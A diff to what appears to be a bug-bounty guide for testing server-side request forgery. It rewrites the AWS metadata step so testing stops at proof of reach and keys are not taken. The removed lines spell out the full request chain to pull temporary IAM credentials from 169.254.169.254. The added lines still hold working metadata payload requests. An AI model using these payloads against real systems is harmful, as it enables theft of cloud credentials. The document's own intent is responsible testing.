@@ -44,29 +44,16 @@ The server fetches the AWS metadata service and returns the response body direct
      ```
    - Check Interactsh for incoming DNS and HTTP requests.
    - **Crucial Rule:** If only DNS interaction is observed but no HTTP GET request, the service might only perform DNS pre-resolving (or DNS pinging). A full SSRF requires an active HTTP fetch.
-3. **Cloud Metadata Extraction (AWS IMDSv1):**
+3. **Cloud Metadata Reach (AWS IMDSv1) — stop at non-secret proof:**
    - Submit the link-local metadata IP:
      ```http
-     GET /resize?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
+     GET /resize?url=http://169.254.169.254/latest/meta-data/instance-id HTTP/1.1
      ```
-   - If the endpoint returns metadata category names (e.g., `ami-id`, `instance-id`, `iam`), traverse to the IAM credentials path:
+   - If the endpoint returns metadata (e.g. `i-0abc...`, or the key list `ami-id`, `instance-id`, `iam`), reach is proven. Optionally list the role **name** only:
      ```http
      GET /resize?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
      ```
-   - Note the role name returned (e.g., `s3-access-role`), then fetch the credentials:
-     ```http
-     GET /resize?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/s3-access-role HTTP/1.1
-     ```
-   - **Expected Vulnerable Response:**
-     ```json
-     {
-       "Code": "Success",
-       "AccessKeyId": "ASIA...",
-       "SecretAccessKey": "...",
-       "Token": "...",
-       "Expiration": "..."
-     }
-     ```
+   - **Stop here.** Requesting `.../security-credentials/<role>` returns live temporary AWS keys (`AccessKeyId`, `SecretAccessKey`, `Token`). That is class S in `SKILL.md`: only with the program's explicit permission. Otherwise describe it as the escalation path (role name + IMDSv1 = credential theft) and let the program verify. If keys are ever returned by accident, do not use or test them, redact them to key names in your evidence, and report immediately so they can be rotated. `ssrf_probe.py` refuses that path and redacts credential-like responses.
 
 ---
 
